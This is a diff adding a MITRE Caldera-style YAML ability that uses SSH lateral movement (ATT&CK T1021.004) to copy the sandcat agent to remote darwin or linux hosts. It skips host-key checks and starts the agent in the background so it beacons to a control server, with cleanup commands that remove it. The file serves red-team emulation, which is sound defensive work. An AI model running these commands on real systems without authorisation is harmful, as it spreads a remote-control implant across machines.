@@ -1,0 +1,59 @@
+- delete_payload: true
+  tactic: lateral-movement
+  technique_id: T1021.004
+  repeatable: false
+  access: {}
+  plugin: stockpile
+  singleton: true
+  executors:
+  - parsers: []
+    language: null
+    platform: darwin
+    cleanup:
+    - 'ssh -o ConnectTimeout=3 #{remote.ssh.cmd} ''pkill -f sandcat & rm -f ~/sandcat.go'''
+    timeout: 60
+    variations: []
+    command: 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3
+      sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&
+
+      ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3
+      #{remote.ssh.cmd} ''nohup ./sandcat.go -server #{server} -group red 1>/dev/null
+      2>/dev/null &'''
+    additional_info: {}
+    uploads: []
+    code: null
+    build_target: null
+    payloads:
+    - sandcat.go-darwin
+    name: sh
+  - parsers: []
+    language: null
+    platform: linux
+    cleanup:
+    - 'ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} ''pkill
+      -f sandcat & rm -f ~/sandcat.go'''
+    timeout: 60
+    variations: []
+    command: 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3
+      sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&
+
+      ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3
+      #{remote.ssh.cmd} ''nohup ./sandcat.go -server #{server} -group red 1>/dev/null
+      2>/dev/null &'''
+    additional_info: {}
+    uploads: []
+    code: null
+    build_target: null
+    payloads:
+    - sandcat.go-linux
+    name: sh
+  additional_info: {}
+  description: Copy 54ndc47 to remote host and start it, assumes target uses SSH keys
+    and passwordless authentication
+  requirements: []
+  technique_name: 'Remote Services: SSH'
+  privilege: ''
+  buckets:
+  - lateral-movement
+  name: Start 54ndc47
+  id: 10a9d979-e342-418a-a9b0-002c483e0fa6
